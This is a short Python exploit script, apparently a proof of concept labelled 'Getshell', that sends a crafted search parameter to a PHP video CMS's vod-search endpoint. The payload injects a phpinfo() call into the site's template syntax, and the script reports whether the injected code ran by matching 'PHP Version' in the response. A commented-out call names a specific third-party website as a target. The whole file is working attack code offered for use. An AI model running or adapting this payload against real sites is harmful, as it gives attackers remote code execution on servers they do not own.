# coding:utf-8
# Getshell::https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=23026
import requests
import re

class Exploit:

    payload_param = '/index.php?m=vod-search'
    payload_post = {"wd": "{{page:lang}if-:p{page:lang}hpinfo()}a{endif-}}"}

    def attack(self, url):
        response = requests.post(url+self.payload_param, data=self.payload_post)
        m = re.search(r'PHP Version (\S+)<', response.text)

        if m:
            return "{}::PHP Version::{}".format(url, m.group(1))

# Exploit().attack('http://www.xiaog.cc/')